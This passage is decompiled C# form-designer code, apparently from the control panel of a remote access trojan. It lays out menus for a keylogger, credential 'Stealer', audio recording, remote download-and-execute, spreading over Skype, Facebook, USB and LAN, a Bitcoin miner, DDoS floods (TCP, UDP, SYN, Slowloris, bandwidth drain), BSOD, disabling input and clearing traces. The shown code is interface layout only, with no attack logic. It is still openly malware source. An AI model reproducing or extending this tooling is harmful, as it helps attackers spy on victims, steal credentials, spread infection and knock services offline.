            this.ShowTaskbarToolStripMenuItem.Name = "ShowTaskbarToolStripMenuItem";
            size = new Size(0xb0, 0x16);
            this.ShowTaskbarToolStripMenuItem.Size = size;
            this.ShowTaskbarToolStripMenuItem.Text = "Show Taskbar";
            this.ToolStripSeparator3.Name = "ToolStripSeparator3";
            size = new Size(0xad, 6);
            this.ToolStripSeparator3.Size = size;
            this.MsnControlToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.FreezeToolStripMenuItem, this.UnfreezeToolStripMenuItem });
            this.MsnControlToolStripMenuItem.Image = (Image) manager.GetObject("MsnControlToolStripMenuItem.Image");
            this.MsnControlToolStripMenuItem.Name = "MsnControlToolStripMenuItem";
            size = new Size(0xb0, 0x16);
            this.MsnControlToolStripMenuItem.Size = size;
            this.MsnControlToolStripMenuItem.Text = "Msn Control";
            this.FreezeToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.ToolStripTextBox3, this.OkToolStripMenuItem2 });
            this.FreezeToolStripMenuItem.Image = (Image) manager.GetObject("FreezeToolStripMenuItem.Image");
            this.FreezeToolStripMenuItem.Name = "FreezeToolStripMenuItem";
            size = new Size(0x74, 0x16);
            this.FreezeToolStripMenuItem.Size = size;
            this.FreezeToolStripMenuItem.Text = "Freeze";
            this.ToolStripTextBox3.Font = new Font("Tahoma", 8.25f);
            this.ToolStripTextBox3.Name = "ToolStripTextBox3";
            size = new Size(100, 0x15);
            this.ToolStripTextBox3.Size = size;
            this.ToolStripTextBox3.Text = "email@hotmail.fr";
            this.OkToolStripMenuItem2.Image = Class5.smethod_7();
            this.OkToolStripMenuItem2.Name = "OkToolStripMenuItem2";
            size = new Size(160, 0x16);
            this.OkToolStripMenuItem2.Size = size;
            this.OkToolStripMenuItem2.Text = ":: Ok ::";
            this.UnfreezeToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.ToolStripTextBox4, this.OkToolStripMenuItem3 });
            this.UnfreezeToolStripMenuItem.Image = (Image) manager.GetObject("UnfreezeToolStripMenuItem.Image");
            this.UnfreezeToolStripMenuItem.Name = "UnfreezeToolStripMenuItem";
            size = new Size(0x74, 0x16);
            this.UnfreezeToolStripMenuItem.Size = size;
            this.UnfreezeToolStripMenuItem.Text = "Unfreeze";
            this.ToolStripTextBox4.Font = new Font("Tahoma", 8.25f);
            this.ToolStripTextBox4.Name = "ToolStripTextBox4";
            size = new Size(100, 0x15);
            this.ToolStripTextBox4.Size = size;
            this.ToolStripTextBox4.Text = "email@hotmail.fr";
            this.OkToolStripMenuItem3.Image = Class5.smethod_7();
            this.OkToolStripMenuItem3.Name = "OkToolStripMenuItem3";
            size = new Size(160, 0x16);
            this.OkToolStripMenuItem3.Size = size;
            this.OkToolStripMenuItem3.Text = ":: Ok ::";
            this.ToolStripSeparator6.Name = "ToolStripSeparator6";
            size = new Size(0xad, 6);
            this.ToolStripSeparator6.Size = size;
            this.BipSoundToolStripMenuItem.Image = (Image) manager.GetObject("BipSoundToolStripMenuItem.Image");
            this.BipSoundToolStripMenuItem.Name = "BipSoundToolStripMenuItem";
            size = new Size(0xb0, 0x16);
            this.BipSoundToolStripMenuItem.Size = size;
            this.BipSoundToolStripMenuItem.Text = "Bip Sound ";
            this.ToolStripSeparator8.Name = "ToolStripSeparator8";
            size = new Size(0xad, 6);
            this.ToolStripSeparator8.Size = size;
            this.RandomIconDesktopToolStripMenuItem.Image = (Image) manager.GetObject("RandomIconDesktopToolStripMenuItem.Image");
            this.RandomIconDesktopToolStripMenuItem.Name = "RandomIconDesktopToolStripMenuItem";
            size = new Size(0xb0, 0x16);
            this.RandomIconDesktopToolStripMenuItem.Size = size;
            this.RandomIconDesktopToolStripMenuItem.Text = "Random Icon Desktop";
            this.ToolStripSeparator10.Name = "ToolStripSeparator10";
            size = new Size(0xad, 6);
            this.ToolStripSeparator10.Size = size;
            this.RandomCursorToolStripMenuItem.Image = (Image) manager.GetObject("RandomCursorToolStripMenuItem.Image");
            this.RandomCursorToolStripMenuItem.Name = "RandomCursorToolStripMenuItem";
            size = new Size(0xb0, 0x16);
            this.RandomCursorToolStripMenuItem.Size = size;
            this.RandomCursorToolStripMenuItem.Text = "Random Cursor";
            this.ToolStripSeparator11.Name = "ToolStripSeparator11";
            size = new Size(0xad, 6);
            this.ToolStripSeparator11.Size = size;
            this.BSODToolStripMenuItem.Image = Class5.smethod_16();
            this.BSODToolStripMenuItem.Name = "BSODToolStripMenuItem";
            size = new Size(0xb0, 0x16);
            this.BSODToolStripMenuItem.Size = size;
            this.BSODToolStripMenuItem.Text = "BSOD";
            this.ToolStripSeparator9.Name = "ToolStripSeparator9";
            size = new Size(0xad, 6);
            this.ToolStripSeparator9.Size = size;
            this.SwapMouseButtonToolStripMenuItem.Image = Class5.smethod_55();
            this.SwapMouseButtonToolStripMenuItem.Name = "SwapMouseButtonToolStripMenuItem";
            size = new Size(0xb0, 0x16);
            this.SwapMouseButtonToolStripMenuItem.Size = size;
            this.SwapMouseButtonToolStripMenuItem.Text = "Swap Mouse Button";
            this.FixMouseButtonToolStripMenuItem.Image = Class5.smethod_56();
            this.FixMouseButtonToolStripMenuItem.Name = "FixMouseButtonToolStripMenuItem";
            size = new Size(0xb0, 0x16);
            this.FixMouseButtonToolStripMenuItem.Size = size;
            this.FixMouseButtonToolStripMenuItem.Text = "Fix Mouse Button";
            this.ToolStripSeparator12.Name = "ToolStripSeparator12";
            size = new Size(0xad, 6);
            this.ToolStripSeparator12.Size = size;
            this.MatrixScreenToolStripMenuItem.Image = (Image) manager.GetObject("MatrixScreenToolStripMenuItem.Image");
            this.MatrixScreenToolStripMenuItem.Name = "MatrixScreenToolStripMenuItem";
            size = new Size(0xb0, 0x16);
            this.MatrixScreenToolStripMenuItem.Size = size;
            this.MatrixScreenToolStripMenuItem.Text = "Matrix";
            this.ProcessesToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.ListToolStripMenuItem, this.StartToolStripMenuItem3, this.KillToolStripMenuItem });
            this.ProcessesToolStripMenuItem.Image = (Image) manager.GetObject("ProcessesToolStripMenuItem.Image");
            this.ProcessesToolStripMenuItem.Name = "ProcessesToolStripMenuItem";
            size = new Size(0xcd, 0x16);
            this.ProcessesToolStripMenuItem.Size = size;
            this.ProcessesToolStripMenuItem.Text = "Processes";
            this.ListToolStripMenuItem.Image = (Image) manager.GetObject("ListToolStripMenuItem.Image");
            this.ListToolStripMenuItem.Name = "ListToolStripMenuItem";
            size = new Size(0x61, 0x16);
            this.ListToolStripMenuItem.Size = size;
            this.ListToolStripMenuItem.Text = "List";
            this.StartToolStripMenuItem3.Image = (Image) manager.GetObject("StartToolStripMenuItem3.Image");
            this.StartToolStripMenuItem3.Name = "StartToolStripMenuItem3";
            size = new Size(0x61, 0x16);
            this.StartToolStripMenuItem3.Size = size;
            this.StartToolStripMenuItem3.Text = "Start";
            this.KillToolStripMenuItem.Image = (Image) manager.GetObject("KillToolStripMenuItem.Image");
            this.KillToolStripMenuItem.Name = "KillToolStripMenuItem";
            size = new Size(0x61, 0x16);
            this.KillToolStripMenuItem.Size = size;
            this.KillToolStripMenuItem.Text = "Kill";
            this.RecordAudioToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.RecordToolStripMenuItem, this.StopRecordToolStripMenuItem, this.ToolStripSeparator5, this.GetRecordToolStripMenuItem });
            this.RecordAudioToolStripMenuItem.Image = (Image) manager.GetObject("RecordAudioToolStripMenuItem.Image");
            this.RecordAudioToolStripMenuItem.Name = "RecordAudioToolStripMenuItem";
            size = new Size(0xcd, 0x16);
            this.RecordAudioToolStripMenuItem.Size = size;
            this.RecordAudioToolStripMenuItem.Text = "Record Audio";
            this.RecordToolStripMenuItem.Image = Class5.smethod_52();
            this.RecordToolStripMenuItem.Name = "RecordToolStripMenuItem";
            size = new Size(0x84, 0x16);
            this.RecordToolStripMenuItem.Size = size;
            this.RecordToolStripMenuItem.Text = "Start Record";
            this.StopRecordToolStripMenuItem.Image = (Image) manager.GetObject("StopRecordToolStripMenuItem.Image");
            this.StopRecordToolStripMenuItem.Name = "StopRecordToolStripMenuItem";
            size = new Size(0x84, 0x16);
            this.StopRecordToolStripMenuItem.Size = size;
            this.StopRecordToolStripMenuItem.Text = "Stop Record";
            this.ToolStripSeparator5.Name = "ToolStripSeparator5";
            size = new Size(0x81, 6);
            this.ToolStripSeparator5.Size = size;
            this.GetRecordToolStripMenuItem.Image = (Image) manager.GetObject("GetRecordToolStripMenuItem.Image");
            this.GetRecordToolStripMenuItem.Name = "GetRecordToolStripMenuItem";
            size = new Size(0x84, 0x16);
            this.GetRecordToolStripMenuItem.Size = size;
            this.GetRecordToolStripMenuItem.Text = "Get Record";
            this.ComputerToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.RestartToolStripMenuItem, this.ShutdownToolStripMenuItem, this.EnableMouseAndKeyboardToolStripMenuItem, this.DisableMouseAndKeyboardToolStripMenuItem, this.ClearTraceHistoryToolStripMenuItem });
            this.ComputerToolStripMenuItem.Image = (Image) manager.GetObject("ComputerToolStripMenuItem.Image");
            this.ComputerToolStripMenuItem.Name = "ComputerToolStripMenuItem";
            size = new Size(0xcd, 0x16);
            this.ComputerToolStripMenuItem.Size = size;
            this.ComputerToolStripMenuItem.Text = "Computer";
            this.RestartToolStripMenuItem.Image = (Image) manager.GetObject("RestartToolStripMenuItem.Image");
            this.RestartToolStripMenuItem.Name = "RestartToolStripMenuItem";
            size = new Size(0xd3, 0x16);
            this.RestartToolStripMenuItem.Size = size;
            this.RestartToolStripMenuItem.Text = "Restart";
            this.ShutdownToolStripMenuItem.Image = (Image) manager.GetObject("ShutdownToolStripMenuItem.Image");
            this.ShutdownToolStripMenuItem.Name = "ShutdownToolStripMenuItem";
            size = new Size(0xd3, 0x16);
            this.ShutdownToolStripMenuItem.Size = size;
            this.ShutdownToolStripMenuItem.Text = "Shutdown";
            this.EnableMouseAndKeyboardToolStripMenuItem.Image = (Image) manager.GetObject("EnableMouseAndKeyboardToolStripMenuItem.Image");
            this.EnableMouseAndKeyboardToolStripMenuItem.Name = "EnableMouseAndKeyboardToolStripMenuItem";
            size = new Size(0xd3, 0x16);
            this.EnableMouseAndKeyboardToolStripMenuItem.Size = size;
            this.EnableMouseAndKeyboardToolStripMenuItem.Text = "Enable Mouse And Keyboard";
            this.DisableMouseAndKeyboardToolStripMenuItem.Image = (Image) manager.GetObject("DisableMouseAndKeyboardToolStripMenuItem.Image");
            this.DisableMouseAndKeyboardToolStripMenuItem.Name = "DisableMouseAndKeyboardToolStripMenuItem";
            size = new Size(0xd3, 0x16);
            this.DisableMouseAndKeyboardToolStripMenuItem.Size = size;
            this.DisableMouseAndKeyboardToolStripMenuItem.Text = "Disable Mouse And Keyboard";
            this.ClearTraceHistoryToolStripMenuItem.Image = Class5.smethod_21();
            this.ClearTraceHistoryToolStripMenuItem.Name = "ClearTraceHistoryToolStripMenuItem";
            size = new Size(0xd3, 0x16);
            this.ClearTraceHistoryToolStripMenuItem.Size = size;
            this.ClearTraceHistoryToolStripMenuItem.Text = "Clear Trace/History";
            this.StealerToolStripMenuItem.Image = (Image) manager.GetObject("StealerToolStripMenuItem.Image");
            this.StealerToolStripMenuItem.Name = "StealerToolStripMenuItem";
            size = new Size(0xcd, 0x16);
            this.StealerToolStripMenuItem.Size = size;
            this.StealerToolStripMenuItem.Text = "Stealer";
            this.RemoteFileManagerToolStripMenuItem.Image = (Image) manager.GetObject("RemoteFileManagerToolStripMenuItem.Image");
            this.RemoteFileManagerToolStripMenuItem.Name = "RemoteFileManagerToolStripMenuItem";
            size = new Size(0xcd, 0x16);
            this.RemoteFileManagerToolStripMenuItem.Size = size;
            this.RemoteFileManagerToolStripMenuItem.Text = "Remote File Manager";
            this.KeyloggzeToolStripMenuItem.Image = Class5.smethod_36();
            this.KeyloggzeToolStripMenuItem.Name = "KeyloggzeToolStripMenuItem";
            size = new Size(0xcd, 0x16);
            this.KeyloggzeToolStripMenuItem.Size = size;
            this.KeyloggzeToolStripMenuItem.Text = "Keylogger";
            this.OpenWebsiteToolStripMenuItem.Image = (Image) manager.GetObject("OpenWebsiteToolStripMenuItem.Image");
            this.OpenWebsiteToolStripMenuItem.Name = "OpenWebsiteToolStripMenuItem";
            size = new Size(0xcd, 0x16);
            this.OpenWebsiteToolStripMenuItem.Size = size;
            this.OpenWebsiteToolStripMenuItem.Text = "Open Website";
            this.VisitWebsiteToolStripMenuItem.Image = Class5.smethod_38();
            this.VisitWebsiteToolStripMenuItem.Name = "VisitWebsiteToolStripMenuItem";
            size = new Size(0xcd, 0x16);
            this.VisitWebsiteToolStripMenuItem.Size = size;
            this.VisitWebsiteToolStripMenuItem.Text = "Visit Website";
            this.RemoteDownloadExecuteToolStripMenuItem.Image = (Image) manager.GetObject("RemoteDownloadExecuteToolStripMenuItem.Image");
            this.RemoteDownloadExecuteToolStripMenuItem.Name = "RemoteDownloadExecuteToolStripMenuItem";
            size = new Size(0xcd, 0x16);
            this.RemoteDownloadExecuteToolStripMenuItem.Size = size;
            this.RemoteDownloadExecuteToolStripMenuItem.Text = @"Remote Download \ Execute";
            this.FileManagerToolStripMenuItem.Image = (Image) manager.GetObject("FileManagerToolStripMenuItem.Image");
            this.FileManagerToolStripMenuItem.Name = "FileManagerToolStripMenuItem";
            size = new Size(0xcd, 0x16);
            this.FileManagerToolStripMenuItem.Size = size;
            this.FileManagerToolStripMenuItem.Text = "Chat";
            this.SpreadToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.SkypeToolStripMenuItem, this.FacebookToolStripMenuItem, this.UsbToolStripMenuItem, this.LanToolStripMenuItem });
            this.SpreadToolStripMenuItem.Image = (Image) manager.GetObject("SpreadToolStripMenuItem.Image");
            this.SpreadToolStripMenuItem.Name = "SpreadToolStripMenuItem";
            size = new Size(0xcd, 0x16);
            this.SpreadToolStripMenuItem.Size = size;
            this.SpreadToolStripMenuItem.Text = "Spread";
            this.SkypeToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.ToolStripTextBox2, this.OkToolStripMenuItem1 });
            this.SkypeToolStripMenuItem.Image = (Image) manager.GetObject("SkypeToolStripMenuItem.Image");
            this.SkypeToolStripMenuItem.Name = "SkypeToolStripMenuItem";
            size = new Size(0x77, 0x16);
            this.SkypeToolStripMenuItem.Size = size;
            this.SkypeToolStripMenuItem.Text = "Skype";
            this.ToolStripTextBox2.Font = new Font("Tahoma", 8.25f);
            this.ToolStripTextBox2.Name = "ToolStripTextBox2";
            size = new Size(100, 0x15);
            this.ToolStripTextBox2.Size = size;
            this.ToolStripTextBox2.Text = "Text to spread";
            this.OkToolStripMenuItem1.Image = Class5.smethod_7();
            this.OkToolStripMenuItem1.Name = "OkToolStripMenuItem1";
            size = new Size(160, 0x16);
            this.OkToolStripMenuItem1.Size = size;
            this.OkToolStripMenuItem1.Text = ":: Ok ::";
            this.FacebookToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.ToolStripTextBox13, this.OkToolStripMenuItem7 });
            this.FacebookToolStripMenuItem.Image = Class5.smethod_30();
            this.FacebookToolStripMenuItem.Name = "FacebookToolStripMenuItem";
            size = new Size(0x77, 0x16);
            this.FacebookToolStripMenuItem.Size = size;
            this.FacebookToolStripMenuItem.Text = "Facebook";
            this.ToolStripTextBox13.Name = "ToolStripTextBox13";
            size = new Size(100, 0x15);
            this.ToolStripTextBox13.Size = size;
            this.ToolStripTextBox13.Text = "Message to spread";
            this.OkToolStripMenuItem7.Image = Class5.smethod_7();
            this.OkToolStripMenuItem7.Name = "OkToolStripMenuItem7";
            size = new Size(160, 0x16);
            this.OkToolStripMenuItem7.Size = size;
            this.OkToolStripMenuItem7.Text = ":: Ok ::";
            this.UsbToolStripMenuItem.Image = Class5.smethod_90();
            this.UsbToolStripMenuItem.Name = "UsbToolStripMenuItem";
            size = new Size(0x77, 0x16);
            this.UsbToolStripMenuItem.Size = size;
            this.UsbToolStripMenuItem.Text = "Usb";
            this.LanToolStripMenuItem.Image = Class5.smethod_73();
            this.LanToolStripMenuItem.Name = "LanToolStripMenuItem";
            size = new Size(0x77, 0x16);
            this.LanToolStripMenuItem.Size = size;
            this.LanToolStripMenuItem.Text = "Lan";
            this.HideShowColumsToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.IPAdressToolStripMenuItem, this.VersionToolStripMenuItem, this.StatusToolStripMenuItem, this.ComputerNameToolStripMenuItem, this.UsernameToolStripMenuItem, this.WindowsKeyToolStripMenuItem, this.OSToolStripMenuItem, this.CountryToolStripMenuItem, this.PingToolStripMenuItem });
            this.HideShowColumsToolStripMenuItem.Image = Class5.smethod_15();
            this.HideShowColumsToolStripMenuItem.Name = "HideShowColumsToolStripMenuItem";
            size = new Size(0xcd, 0x16);
            this.HideShowColumsToolStripMenuItem.Size = size;
            this.HideShowColumsToolStripMenuItem.Text = "Hide/Show Columns";
            this.IPAdressToolStripMenuItem.Checked = true;
            this.IPAdressToolStripMenuItem.CheckState = CheckState.Checked;
            this.IPAdressToolStripMenuItem.Name = "IPAdressToolStripMenuItem";
            size = new Size(0x97, 0x16);
            this.IPAdressToolStripMenuItem.Size = size;
            this.IPAdressToolStripMenuItem.Text = "IP Address";
            this.VersionToolStripMenuItem.Checked = true;
            this.VersionToolStripMenuItem.CheckState = CheckState.Checked;
            this.VersionToolStripMenuItem.Name = "VersionToolStripMenuItem";
            size = new Size(0x97, 0x16);
            this.VersionToolStripMenuItem.Size = size;
            this.VersionToolStripMenuItem.Text = "Version";
            this.StatusToolStripMenuItem.Checked = true;
            this.StatusToolStripMenuItem.CheckState = CheckState.Checked;
            this.StatusToolStripMenuItem.Name = "StatusToolStripMenuItem";
            size = new Size(0x97, 0x16);
            this.StatusToolStripMenuItem.Size = size;
            this.StatusToolStripMenuItem.Text = "Status";
            this.ComputerNameToolStripMenuItem.Checked = true;
            this.ComputerNameToolStripMenuItem.CheckState = CheckState.Checked;
            this.ComputerNameToolStripMenuItem.ForeColor = Color.Black;
            this.ComputerNameToolStripMenuItem.Name = "ComputerNameToolStripMenuItem";
            size = new Size(0x97, 0x16);
            this.ComputerNameToolStripMenuItem.Size = size;
            this.ComputerNameToolStripMenuItem.Text = "Computer Name";
            this.UsernameToolStripMenuItem.Checked = true;
            this.UsernameToolStripMenuItem.CheckState = CheckState.Checked;
            this.UsernameToolStripMenuItem.Name = "UsernameToolStripMenuItem";
            size = new Size(0x97, 0x16);
            this.UsernameToolStripMenuItem.Size = size;
            this.UsernameToolStripMenuItem.Text = "Username";
            this.WindowsKeyToolStripMenuItem.Checked = true;
            this.WindowsKeyToolStripMenuItem.CheckState = CheckState.Checked;
            this.WindowsKeyToolStripMenuItem.Name = "WindowsKeyToolStripMenuItem";
            size = new Size(0x97, 0x16);
            this.WindowsKeyToolStripMenuItem.Size = size;
            this.WindowsKeyToolStripMenuItem.Text = "Windows Key";
            this.OSToolStripMenuItem.Checked = true;
            this.OSToolStripMenuItem.CheckState = CheckState.Checked;
            this.OSToolStripMenuItem.Name = "OSToolStripMenuItem";
            size = new Size(0x97, 0x16);
            this.OSToolStripMenuItem.Size = size;
            this.OSToolStripMenuItem.Text = "OS";
            this.CountryToolStripMenuItem.Checked = true;
            this.CountryToolStripMenuItem.CheckState = CheckState.Checked;
            this.CountryToolStripMenuItem.Name = "CountryToolStripMenuItem";
            size = new Size(0x97, 0x16);
            this.CountryToolStripMenuItem.Size = size;
            this.CountryToolStripMenuItem.Text = "Country";
            this.PingToolStripMenuItem.Checked = true;
            this.PingToolStripMenuItem.CheckState = CheckState.Checked;
            this.PingToolStripMenuItem.Name = "PingToolStripMenuItem";
            size = new Size(0x97, 0x16);
            this.PingToolStripMenuItem.Size = size;
            this.PingToolStripMenuItem.Text = "Ping";
            this.Sock5ToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.ToolStripTextBox7, this.OkToolStripMenuItem6 });
            this.Sock5ToolStripMenuItem.Image = Class5.smethod_68();
            this.Sock5ToolStripMenuItem.Name = "Sock5ToolStripMenuItem";
            size = new Size(0xcd, 0x16);
            this.Sock5ToolStripMenuItem.Size = size;
            this.Sock5ToolStripMenuItem.Text = "Sock5";
            this.ToolStripTextBox7.Font = new Font("Tahoma", 8.25f);
            this.ToolStripTextBox7.Name = "ToolStripTextBox7";
            size = new Size(100, 0x15);
            this.ToolStripTextBox7.Size = size;
            this.ToolStripTextBox7.Text = "4000 (port)";
            this.OkToolStripMenuItem6.Image = Class5.smethod_7();
            this.OkToolStripMenuItem6.Name = "OkToolStripMenuItem6";
            size = new Size(160, 0x16);
            this.OkToolStripMenuItem6.Size = size;
            this.OkToolStripMenuItem6.Text = ":: Ok ::";
            this.TracerouteIPToolStripMenuItem.Image = (Image) manager.GetObject("TracerouteIPToolStripMenuItem.Image");
            this.TracerouteIPToolStripMenuItem.Name = "TracerouteIPToolStripMenuItem";
            size = new Size(0xcd, 0x16);
            this.TracerouteIPToolStripMenuItem.Size = size;
            this.TracerouteIPToolStripMenuItem.Text = "IP Tracer";
            this.BotkillToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.StartToolStripMenuItem2, this.StopToolStripMenuItem2 });
            this.BotkillToolStripMenuItem.Image = Class5.smethod_77();
            this.BotkillToolStripMenuItem.Name = "BotkillToolStripMenuItem";
            size = new Size(0xcd, 0x16);
            this.BotkillToolStripMenuItem.Size = size;
            this.BotkillToolStripMenuItem.Text = "Botkill";
            this.StartToolStripMenuItem2.Image = Class5.smethod_7();
            this.StartToolStripMenuItem2.Name = "StartToolStripMenuItem2";
            size = new Size(0x61, 0x16);
            this.StartToolStripMenuItem2.Size = size;
            this.StartToolStripMenuItem2.Text = "Start";
            this.StopToolStripMenuItem2.Image = Class5.smethod_6();
            this.StopToolStripMenuItem2.Name = "StopToolStripMenuItem2";
            size = new Size(0x61, 0x16);
            this.StopToolStripMenuItem2.Size = size;
            this.StopToolStripMenuItem2.Text = "Stop";
            this.BitCoinMinerToolStripMenuItem.Image = Class5.smethod_23();
            this.BitCoinMinerToolStripMenuItem.Name = "BitCoinMinerToolStripMenuItem";
            size = new Size(0xcd, 0x16);
            this.BitCoinMinerToolStripMenuItem.Size = size;
            this.BitCoinMinerToolStripMenuItem.Text = "BitCoin Miner";
            this.DDOSToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.TCPToolStripMenuItem, this.UDPToolStripMenuItem, this.SUDPToolStripMenuItem, this.SSYNToolStripMenuItem, this.SlowlorisToolStripMenuItem, this.EToolStripMenuItem, this.GetIPToolStripMenuItem });
            this.DDOSToolStripMenuItem.Image = (Image) manager.GetObject("DDOSToolStripMenuItem.Image");
            this.DDOSToolStripMenuItem.Name = "DDOSToolStripMenuItem";
            size = new Size(0xcd, 0x16);
            this.DDOSToolStripMenuItem.Size = size;
            this.DDOSToolStripMenuItem.Text = "DDOS";
            this.TCPToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.StartToolStripMenuItem1, this.StopToolStripMenuItem1 });
            this.TCPToolStripMenuItem.Image = Class5.smethod_37();
            this.TCPToolStripMenuItem.Name = "TCPToolStripMenuItem";
            size = new Size(0x99, 0x16);
            this.TCPToolStripMenuItem.Size = size;
            this.TCPToolStripMenuItem.Text = "TCP";
            this.StartToolStripMenuItem1.DropDownItems.AddRange(new ToolStripItem[] { this.ToolStripTextBox9, this.ToolStripTextBox10, this.ToolStripTextBox11, this.AttackToolStripMenuItem });
            this.StartToolStripMenuItem1.Image = Class5.smethod_36();
            this.StartToolStripMenuItem1.Name = "StartToolStripMenuItem1";
            size = new Size(110, 0x16);
            this.StartToolStripMenuItem1.Size = size;
            this.StartToolStripMenuItem1.Text = "Settings";
            this.ToolStripTextBox9.Name = "ToolStripTextBox9";
            size = new Size(100, 0x15);
            this.ToolStripTextBox9.Size = size;
            this.ToolStripTextBox9.Text = "127.0.0.1";
            this.ToolStripTextBox10.Name = "ToolStripTextBox10";
            size = new Size(100, 0x15);
            this.ToolStripTextBox10.Size = size;
            this.ToolStripTextBox10.Text = "80";
            this.ToolStripTextBox11.Name = "ToolStripTextBox11";
            size = new Size(100, 0x15);
            this.ToolStripTextBox11.Size = size;
            this.ToolStripTextBox11.Text = "JASdhnskjabfu(&**Y132hrjnfjBIYFg932gjhFJKb3b8b";
            this.AttackToolStripMenuItem.Image = Class5.smethod_7();
            this.AttackToolStripMenuItem.Name = "AttackToolStripMenuItem";
            size = new Size(160, 0x16);
            this.AttackToolStripMenuItem.Size = size;
            this.AttackToolStripMenuItem.Text = ":: Attack ::";
            this.StopToolStripMenuItem1.Image = Class5.smethod_10();
            this.StopToolStripMenuItem1.Name = "StopToolStripMenuItem1";
            size = new Size(110, 0x16);
            this.StopToolStripMenuItem1.Size = size;
            this.StopToolStripMenuItem1.Text = "Stop";
            this.UDPToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.StartToolStripMenuItem5, this.StopToolStripMenuItem6 });
            this.UDPToolStripMenuItem.Image = Class5.smethod_37();
            this.UDPToolStripMenuItem.Name = "UDPToolStripMenuItem";
            size = new Size(0x99, 0x16);
            this.UDPToolStripMenuItem.Size = size;
            this.UDPToolStripMenuItem.Text = "UDP";
            this.StartToolStripMenuItem5.Image = Class5.smethod_7();
            this.StartToolStripMenuItem5.Name = "StartToolStripMenuItem5";
            size = new Size(0x61, 0x16);
            this.StartToolStripMenuItem5.Size = size;
            this.StartToolStripMenuItem5.Text = "Start";
            this.StopToolStripMenuItem6.Image = Class5.smethod_10();
            this.StopToolStripMenuItem6.Name = "StopToolStripMenuItem6";
            size = new Size(0x61, 0x16);
            this.StopToolStripMenuItem6.Size = size;
            this.StopToolStripMenuItem6.Text = "Stop";
            this.SUDPToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.ToolStripTextBox5, this.ToolStripTextBox12, this.OkToolStripMenuItem4 });
            this.SUDPToolStripMenuItem.Image = Class5.smethod_37();
            this.SUDPToolStripMenuItem.Name = "SUDPToolStripMenuItem";
            size = new Size(0x99, 0x16);
            this.SUDPToolStripMenuItem.Size = size;
            this.SUDPToolStripMenuItem.Text = "SUDP";
            this.ToolStripTextBox5.Font = new Font("Tahoma", 8.25f);
            this.ToolStripTextBox5.Name = "ToolStripTextBox5";
            size = new Size(100, 0x15);
            this.ToolStripTextBox5.Size = size;
            this.ToolStripTextBox5.Text = "127.0.0.1";
            this.ToolStripTextBox12.Name = "ToolStripTextBox12";
            size = new Size(100, 0x15);
            this.ToolStripTextBox12.Size = size;
            this.ToolStripTextBox12.Text = "80";
            this.OkToolStripMenuItem4.Image = Class5.smethod_7();
            this.OkToolStripMenuItem4.Name = "OkToolStripMenuItem4";
            size = new Size(160, 0x16);
            this.OkToolStripMenuItem4.Size = size;
            this.OkToolStripMenuItem4.Text = ":: Start ::";
            this.SSYNToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.StartToolStripMenuItem6, this.StopToolStripMenuItem5 });
            this.SSYNToolStripMenuItem.Image = Class5.smethod_37();
            this.SSYNToolStripMenuItem.Name = "SSYNToolStripMenuItem";
            size = new Size(0x99, 0x16);
            this.SSYNToolStripMenuItem.Size = size;
            this.SSYNToolStripMenuItem.Text = "SYN";
            this.StartToolStripMenuItem6.Image = Class5.smethod_7();
            this.StartToolStripMenuItem6.Name = "StartToolStripMenuItem6";
            size = new Size(0x61, 0x16);
            this.StartToolStripMenuItem6.Size = size;
            this.StartToolStripMenuItem6.Text = "Start";
            this.StopToolStripMenuItem5.Image = Class5.smethod_10();
            this.StopToolStripMenuItem5.Name = "StopToolStripMenuItem5";
            size = new Size(0x61, 0x16);
            this.StopToolStripMenuItem5.Size = size;
            this.StopToolStripMenuItem5.Text = "Stop";
            this.SlowlorisToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.StartToolStripMenuItem4, this.StopToolStripMenuItem4 });
            this.SlowlorisToolStripMenuItem.Image = Class5.smethod_37();
            this.SlowlorisToolStripMenuItem.Name = "SlowlorisToolStripMenuItem";
            size = new Size(0x99, 0x16);
            this.SlowlorisToolStripMenuItem.Size = size;
            this.SlowlorisToolStripMenuItem.Text = "Slowloris";
            this.StartToolStripMenuItem4.Image = Class5.smethod_7();
            this.StartToolStripMenuItem4.Name = "StartToolStripMenuItem4";
            size = new Size(0x61, 0x16);
            this.StartToolStripMenuItem4.Size = size;
            this.StartToolStripMenuItem4.Text = "Start";
            this.StopToolStripMenuItem4.Image = Class5.smethod_10();
            this.StopToolStripMenuItem4.Name = "StopToolStripMenuItem4";
            size = new Size(0x61, 0x16);
            this.StopToolStripMenuItem4.Size = size;
            this.StopToolStripMenuItem4.Text = "Stop";
            this.EToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.ToolStripTextBox8, this.StartToolStripMenuItem });
            this.EToolStripMenuItem.Image = Class5.smethod_37();
            this.EToolStripMenuItem.Name = "EToolStripMenuItem";
            size = new Size(0x99, 0x16);
            this.EToolStripMenuItem.Size = size;
            this.EToolStripMenuItem.Text = "Drain Bandwidth";
            this.ToolStripTextBox8.Font = new Font("Tahoma", 8.25f);
            this.ToolStripTextBox8.Name = "ToolStripTextBox8";
            size = new Size(100, 0x15);
            this.ToolStripTextBox8.Size = size;
            this.ToolStripTextBox8.Tag = "";
            this.ToolStripTextBox8.Text = "http://www.target.com/file.exe";
            this.StartToolStripMenuItem.Image = Class5.smethod_7();
            this.StartToolStripMenuItem.Name = "StartToolStripMenuItem";
            size = new Size(160, 0x16);
            this.StartToolStripMenuItem.Size = size;
            this.StartToolStripMenuItem.Text = ":: Start ::";
            this.GetIPToolStripMenuItem.Image = Class5.smethod_5();
